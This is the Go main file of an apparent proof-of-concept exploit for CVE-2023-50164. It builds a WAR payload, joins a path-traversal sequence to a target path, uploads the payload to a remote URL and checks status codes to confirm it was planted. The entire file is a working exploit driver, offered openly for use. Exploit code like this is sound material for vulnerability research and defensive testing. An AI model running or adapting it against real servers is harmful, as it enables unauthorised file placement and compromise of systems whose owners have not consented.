package main

import (
	"path/filepath"

	"github.com/dwisiswant0/cve-2023-50164-poc/internal/pkg/payload"
	"github.com/dwisiswant0/cve-2023-50164-poc/internal/pkg/utils"
)

func main() {
	if err := prereqChecks(); err != nil {
		log.Error("Runtime error", "err", err.Error())
		log.Info("Use '-h' flag for helps.")
		return
	}

	path := filepath.Join(utils.Traverse(opt.TraverseSeq), opt.Path)

	log.Info("Building payload", "file", opt.File)

	payload, err := payload.Build(opt.File, path)
	if err != nil {
		log.Error("Cannot build payload", "err", err.Error())
		return
	}
	defer payload.Close()

	log.Debug("Payload is built", "war", payload.War)

	log.Debug("Checking", "step", "1/3")

	err = payload.Check(opt.URL, 404)
	if err != nil {
		log.Error(
			"Remote path is available",
			"err", err.Error(),
			"path", payload.Path,
		)
		return
	}

	log.Info("Uploading payload", "step", "2/3")

	err = payload.Upload(opt.URL)
	if err != nil {
		log.Error("Cannot uploading payload", "err", err.Error())
	}

	log.Debug("Checking", "step", "3/3")

	err = payload.Check(opt.URL, 200)
	if err != nil {
		log.Error(
			"Remote path is NOT available",
			"err", err.Error(),
		)
		return
	}

	log.Info("Payload uploaded", "path", payload.Path)
}
